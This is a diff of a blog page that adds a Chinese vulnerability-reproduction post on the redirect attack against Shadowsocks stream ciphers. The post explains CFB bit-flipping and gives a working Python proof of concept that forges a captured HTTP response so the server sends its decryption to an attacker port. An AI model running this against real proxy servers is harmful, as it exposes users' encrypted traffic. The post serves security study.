@@ -22,7 +22,7 @@
     <meta name="description" content="长颈鹿的脖子为什么那么长？">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Sissel&#39;s blog</title>
+    <title>【漏洞复现】Redirect attack on Shadowsocks stream ciphers · Sissel&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 <meta name="generator" content="Hexo 5.2.0"></head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Sissel&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">【漏洞复现】Redirect attack on Shadowsocks stream ciphers</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>Sissel's blog</a>
 </header>
@@ -220,24 +231,78 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            【漏洞复现】Redirect attack on Shadowsocks stream ciphers
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Crypto">Crypto</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "shadowsocks">shadowsocks</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.2k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/04/20</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,283 +403,95 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/06/20/wp-qwb2021-qual-blockchain-onegadget/" >
-            
-                <span>【区块链】强网杯2021线上赛 OneGadget</span>
-        </a>
-        <div class="abstract-content">
-            <p>五层合约，构造符合要求的msg.data可以完成题目任务。</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/06/20</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "区块链">区块链</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "天枢">天枢</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>给出了一种重放的思路，在满足两个条件：【截获了ss-local to ss-server的流量、shadowsocks服务选择stream ciphers且目前仍在运行】的情况下，可以解密许多类型的流量，给出了http和https的例子。后面会再尝试复现一下思路相同的，defcon29的 PERSONAL PROXY题目。</p>
+<a id="more"></a>
+<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p>彭博士太强了= =</p>
+<blockquote>
+<p>Zhiniang Peng from Qihoo 360 Core Security<br><a target="_blank" rel="noopener" href="https://github.com/edwardz246003/shadowsocks">https://github.com/edwardz246003/shadowsocks</a></p>
+</blockquote>
+<p>有一篇非常详细的分析，看他甚至比看懂我的强：<br><a target="_blank" rel="noopener" href="https://github.com/net4people/bbs/issues/24">https://github.com/net4people/bbs/issues/24</a></p>
+<h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="加密方式"><a href="#加密方式" class="headerlink" title="加密方式"></a>加密方式</h3><p>shadowsocks目前支持的加密方式</p>
+<p><img src="https://md.byr.moe/uploads/upload_93195292dfe74b9eddb9381c4b850de3.png" alt=""></p>
+<p>其中stream ciphers有</p>
+<blockquote>
+<p>Rc4-md5, salsa20,chacha20,chacha-ietf, aes-ctr, bf-cfb, camellia-cfb, aes-cfb</p>
+</blockquote>
+<p>文章中选取了 aes-256-cfb 作为demo。</p>
+<h3 id="ss协议"><a href="#ss协议" class="headerlink" title="ss协议"></a>ss协议</h3><p>我们仅需要了解建立tcp连接的前半段就ok了，更加详细的可以参考这个：<a target="_blank" rel="noopener" href="https://www.ichenxiaoyu.com/ss/">https://www.ichenxiaoyu.com/ss/</a></p>
+<p>建立tcp连接<br>[ target address ][ payload ]</p>
+<p>target address具体的信令，类似于socks5<br>[ 1-byte type ][ variable-length host ][ 2-byte port ]<br>0x01 0xc0b00101 0x00b8</p>
+<blockquote>
+<p>The following address types are defned:<br>0x01: host is a 4-byte IPv4 address.<br>0x03: host is a variable length string, starting with a 1-byte length, followed by up to<br>255-byte domain name.<br>0x04: host is a 16-byte IPv6 address<br>The port number is a 2-byte big-endian unsigned integer.</p>
+</blockquote>
+<p>举例，客户端要发一个经过shadowsocks的http请求的时候，构造的包的plaintext就应该长这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 192.168.1.1 45761 GET &#x2F;uri HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure></p>
+<p>ss-local构造完，发送给ss-server的密文就是（忽略掉字节数）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iv</span><br><span class="line">c0  01 192.168.1.1 45761 GET &#x2F;u </span><br><span class="line">c1  ri HTTP&#x2F;1.1\r\n balabala</span><br><span class="line">c2</span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
+<h3 id="cfb分组"><a href="#cfb分组" class="headerlink" title="cfb分组"></a>cfb分组</h3><p><img src="https://md.byr.moe/uploads/upload_59c2588025de43c0a6900b10f67ec843.png" alt=""></p>
+<p>根据cfb的解密方式我们可以发现，假设密文分组，c0、c1，当我修改密文分组c1的时候，我可以影响分组0的解密结果。并且修改c1不具有传播性，仅会使分组1的解密结果为乱码。</p>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h3><p>ss-server：192.168.1.8:34549<br>监听一个端口，用来接收解密流量：10.10.10.10:1337<br>用户访问的网站是通过ipv4地址访问的，ipv6地址理论上也可以，而直接使用</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>利用方式可以简述为：</p>
+<ol>
+<li>找到一个http请求（其实就是抓大量的tcp连接，里面总会有符合要求的），抓到ss-local与ss-server交互的tcp连接的流量，我们需要其中http的响应包加密后的包</li>
+<li>http请求的response开头一定是 <code>HTTP/1.1</code>，根据cfb的分组模式，可以通过异或，在破坏c1分组的解密结果条件下，可以任意的修改c0分组解析结果。</li>
+<li>监听一个端口，准备接受解密的流量。例如 127.0.0.1 9999，按照ss的方式构造成信令：<code>\x01\x7f\x00\x00\x01\x27\x0f</code> 就是 <code>\x01 127.0.0.1 9999</code>。</li>
+<li>找到http响应包加密后的结果，将其第一个分组的前七个字节（第零个分组为iv），与 上面的信令和<code>HTTP/1.</code> 进行异或，把得到的新密文，直接丢给ss-server监听的端口进行重放</li>
+<li>在恶意的端口处收到解密结果。</li>
+</ol>
+<p>其中第四点是最重要的，核心为把密文丢给ss-server，让服务端解密并把明文发送出来，可以理解成特殊的 <strong>选择明文攻击</strong> 。</p>
+<h3 id="调试的记录"><a href="#调试的记录" class="headerlink" title="调试的记录"></a>调试的记录</h3><p><img src="https://md.byr.moe/uploads/upload_b4dd3e86f7915d25ebbe2db2912a81ea.png" alt=""></p>
+<p><img src="https://md.byr.moe/uploads/upload_99f333a91e2aef8732745fb5f3c67fc0.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line"></span><br><span class="line">def xor(s1,s2):</span><br><span class="line">	n&#x3D;len(s1)</span><br><span class="line">	r&#x3D;&#39;&#39;</span><br><span class="line">	for i in range(n):</span><br><span class="line">		r+&#x3D;chr(ord(s1[i])^ord(s2[i]))</span><br><span class="line">	return r</span><br><span class="line">method&#x3D;&#39;aes-256-cfb&#39;</span><br><span class="line">def up(c):</span><br><span class="line">    l&#x3D;16-len(c)%16</span><br><span class="line">    c&#x3D;c+&#39;\x00&#39;*l</span><br><span class="line">    return c</span><br><span class="line">#c is a capture http packet. 过长，已截断</span><br><span class="line">c&#x3D;&#39;3fee10c03db9d03074ecd3e550644be7d68e241a1dede8d3a202012da462c4a1743feffd5856264ce56e453026dd391c8ad6d638f6b77285597de92e5c247306dd02aa5dd767d70fb6c0b0fd48531c4d1bf5ceb99c1e8d6ecd72a4f08c20d0251ddc6cf42fef59c158e5830faf7f50f0c4674da516cc13e5f9d10f8a623617b4f34e8187e6c3d7ec8389450df6f95e88ef34b5cadc14a9e554df3bf53f12647f7dd4ae65157015244cdaf7f6f516f3d5aaf4e8b91630b0d223f365b709b8639fc71dfa1a38a0f215cb1cf054752a7bbf4f20d93f2453abfc85f08c2a1c38dc10f3e002b43c61de6388c574cd033ba51abbf3048388a7e09b1f5c0829864cb7965a551fe47c5a98a7244af2b9d08f0ffa2e4244d6e7c092fb62029c8899f5842d7ae186e45f8dda9f965d540f3c14d326cdffbac4c899d602a455c71d28bc5e056760ed24420f58aae2462285e37acf85089bf28f302241097d5b02e609b6ea48d147f1677049d14a83f853074d95a3b3da8a44e0f140bea952515f95fa435fc39502661c1f7708f584288c83daa0e123bcb2d1bba6a96ce8a1e4a5616e24c9382a0bf8f602d4ca8c3dc0e4bbd57811767ae909aa4c04ad44e414ee68b876391993ee6cad2277b898cd959d8db872514f3bc8e3ad0c4420f43d24a7e7591a7512190d032e3a9f42dcb1e1dc61c2cb3a7b306f8e0cffac314f6425fa1d0051b7d20bb44cebcc45de3e2088f09c0121bdf3c8bd64a80df02c74f78d0ec8406c4cff6569d1fff42efb14fa47f8c76ca7a8fce758b0a5ea03ad37a8a1a5cb5a9a2807fa819aea3be69a89c064ad9b53cfbecd58cb552b6b807ae119092cc2e74ce5e22125ea2b899bd0e2cc67336d1c6aa1a6a0ef292f1216f88e11e114c9ecd932f41088510a794199d01f7f0974aeaa50c5b11b44513f69605367b53e985e565b9759b971e758064c62980bcddcacd613e66fadc2afaf0096bd232f63105370670fa3897473143125ef7ab5cbcaf276fd39d8932433e33517dd930deb018c0db6e25e6956d49d35b2ac39e0940c2209034fc9c376ab8df52fb1748838e610983ecaf52882c0fcc4c589626d6ed6eff1f76a20a3eebb36b3c8af1dcb6ad1618c121f6043473bba5c00ee52beedecf5dcb6ff4169bf7f0c5a05959b1cf8738f38db1ee80ece7e131576a5e74928e940335565d941f4a5597c4e5fe650084bbe3ea41bdbfef9042aaef5cbbaac47bd511a9d248b60af059c986e88931a0908870a53468672ce5327d9ea550e3ed29926ead0&#39;</span><br><span class="line">c&#x3D;c.decode(&#39;hex&#39;)</span><br><span class="line">c&#x3D;up(c)</span><br><span class="line">prefix_http&#x3D;&#39;HTTP&#x2F;1.&#39;</span><br><span class="line">targetIP &#x3D; &#39;\x01\x7f\x00\x00\x01\x27\x0f&#39; # 127.0.0.1 9999</span><br><span class="line">x&#x3D;xor(prefix_http,targetIP)</span><br><span class="line">y&#x3D;c[16:16+7]</span><br><span class="line">z&#x3D;xor(x,y)</span><br><span class="line">cipertext&#x3D;c[0:16]+z+c[16+7:]</span><br><span class="line">import socket</span><br><span class="line">obj &#x3D; socket.socket()</span><br><span class="line">print (&quot;begin\n&quot;)</span><br><span class="line">obj.connect((&quot;127.0.0.1&quot;,40623))</span><br><span class="line">obj.send(cipertext)</span><br><span class="line">buf&#x3D;obj.recv(1024)</span><br></pre></td></tr></table></figure>
+<h2 id="总结与其他"><a href="#总结与其他" class="headerlink" title="总结与其他"></a>总结与其他</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们可以扩展一下还有哪些包可以解析，理论上请求都不好解析。请求的数据是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address + payload</span><br></pre></td></tr></table></figure><br>我们需要已知address的情况下，才能利用分组密码的翻转特性来进行重放和转发。</p>
+<p>其他Response呢？大多数协议都会有固定的headers，有很大的可能可以解析，甚至可以写一个工具来进行常见的fuzz。</p>
+<h3 id="CTF中的题目"><a href="#CTF中的题目" class="headerlink" title="CTF中的题目"></a>CTF中的题目</h3><p>在defcon29的比赛中，遇到了PERSONAL PROXY这个题目，他的实现是shadowsocks里面套了一层socks5代理。而socks5代理具有明显的信令特征。经过一定的测信道分析可以完成这个题目，具体题解参照这里：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.soreatu.com/posts/writeup-for-billboard-and-personal-proxy-in-real-world-ctf-2020-2021/#socks5">https://blog.soreatu.com/posts/writeup-for-billboard-and-personal-proxy-in-real-world-ctf-2020-2021/#socks5</a></p>
+
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2021/04/20/study-shadowsocks-redirect-attack/" >
-            
-                <span>【漏洞复现】Redirect attack on Shadowsocks stream ciphers</span>
-        </a>
-        <div class="abstract-content">
-            <p>给出了一种重放的思路，在满足两个条件：【截获了ss-local to ss-server的流量、shadowsocks服务选择stream ciphers且目前仍在运行】的情况下，可以解密许多类型的流量，给出了http和https的例子。后面会再尝试复现一下思路相同的，defcon29的 PERSONAL PROXY题目。</p>
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://sisselcbp.github.com">Sissel</a>
+            <p>原文链接：<a href="https://sisselcbp.github.com/2021/04/20/study-shadowsocks-redirect-attack/">https://sisselcbp.github.com/2021/04/20/study-shadowsocks-redirect-attack/</a>
+            <p>发表日期：<a href="https://sisselcbp.github.com/2021/04/20/study-shadowsocks-redirect-attack/">April 20th 2021, 11:12:55 am</a>
+            <p>更新日期：<a href="https://sisselcbp.github.com/2021/04/20/study-shadowsocks-redirect-attack/">June 30th 2021, 9:46:06 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2021/04/20</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Crypto">Crypto</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "shadowsocks">shadowsocks</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/03/20/wp-202002zhanyi-OwnerMoney/" >
-            
-                <span>【区块链】赛宁新春战役CTF-区块链-OwnerMoney</span>
-        </a>
-        <div class="abstract-content">
-            <p>从2019年开始，题目逐渐向合约逆向靠拢。。</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/20</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "天枢">天枢</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/01/20/wp-202001hitcon-Bank/" >
-            
-                <span>【区块链】Hitcon2019-区块链-Bank</span>
-        </a>
-        <div class="abstract-content">
-            <p>考察智能合约中的结构体存储，导致的变量覆盖漏洞，题目不是很难，主要是mapping中的数组计算的时候，比较容易算错。我是这个题目所有参赛队伍的唯一解！</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/01/20</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "天枢">天枢</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/01/20/wp-202001hitcon-Creativity/" >
-            
-                <span>【区块链】Hitcon2019-区块链-Creativity</span>
-        </a>
-        <div class="abstract-content">
-            <p>考察create2指令，Hitcon我认为最难的一个区块链题目，我是这个题目所有参赛队伍的唯一解！</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/01/20</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "天枢">天枢</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/03/23/wp-201905tctf-quals/" >
-            
-                <span>【writeup】tctf2019-quals</span>
-        </a>
-        <div class="abstract-content">
-            <p>新年开赛第一场！本场是作为 <a target="_blank" rel="noopener" href="https://ctftime.org/team/55193">emmmm</a> 战队的成员和大家一起打的>_&lt;，我们是来自中国科技大学&amp;北京邮电大学&amp;北京理工大学&amp;哈尔滨工业大学的一群有爱的小伙伴哈哈哈。PS：郑老太强了orz</p>
-<p>本次比赛题目十分有难度，这里是web和crypto的较详细wp。</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/23</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "天枢">天枢</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/11/21/wp-2018hctf/" >
-            
-                <span>【writeup】hctf2018</span>
-        </a>
-        <div class="abstract-content">
-            <p>来自杭电师傅的HCTF，比赛很有趣！本次比赛线上赛我们好像是第四还是第五，线下赛是Henryzhao，姚老板和禹越去的，拿了线下赛第一吼吼~</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/21</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "天枢">天枢</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/10/15/wp-2018dorahack-blockchain/" >
-            
-                <span>【writeup】DoraHacks 区块链安全Hackathon</span>
-        </a>
-        <div class="abstract-content">
-            <p>早先就对DoraHacks举办的各种hackathon有所耳闻，一直想来参加感受一次，这次很高兴天枢能够受邀参加本场区块链安全比赛，与诸位师傅共同度过一个知性而优雅的周末。各大厂商在周六都分享了许多有意思的思路、或是自家引以为傲的产品和解决方案，开拓了我和小伙伴们的眼界。一下午的展示中收获了良多干货，为第二天的比赛也开拓了思路。</p>
-<p>本次见识到了平时只能在线上看到的诸位大师傅，也有幸享受到了师傅们精心准备的题目，包含了合约审计、漏洞利用、硬件方案、密码学、交易所安全等多个类型，受益良多。也吐槽一句，师傅们颜值都好高呀！</p>
-<p>这里给出Q1、4、11、14、15 我们队的解答。</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/15</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "区块链">区块链</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "天枢">天枢</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "智能合约">智能合约</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2021/06/20/wp-qwb2021-qual-blockchain-onegadget/" title= "【区块链】强网杯2021线上赛 OneGadget">
+                    <div class="nextTitle">【区块链】强网杯2021线上赛 OneGadget</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/12/02/study-sqli/" title= "【学习】天枢队内培训-SQL注入部分">
+                    <div class="prevTitle">【学习】天枢队内培训-SQL注入部分</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -704,6 +581,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80"><span class="toc-number">1.</span> <span class="toc-text">项目地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">基本知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F"><span class="toc-number">2.1.</span> <span class="toc-text">加密方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ss%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.2.</span> <span class="toc-text">ss协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cfb%E5%88%86%E7%BB%84"><span class="toc-number">2.3.</span> <span class="toc-text">cfb分组</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%87%E8%AE%BE"><span class="toc-number">3.1.</span> <span class="toc-text">假设</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%9A%84%E8%AE%B0%E5%BD%95"><span class="toc-number">3.3.</span> <span class="toc-text">调试的记录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%85%B6%E4%BB%96"><span class="toc-number">4.</span> <span class="toc-text">总结与其他</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.1.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CTF%E4%B8%AD%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-number">4.2.</span> <span class="toc-text">CTF中的题目</span></a></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1194,6 +1089,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
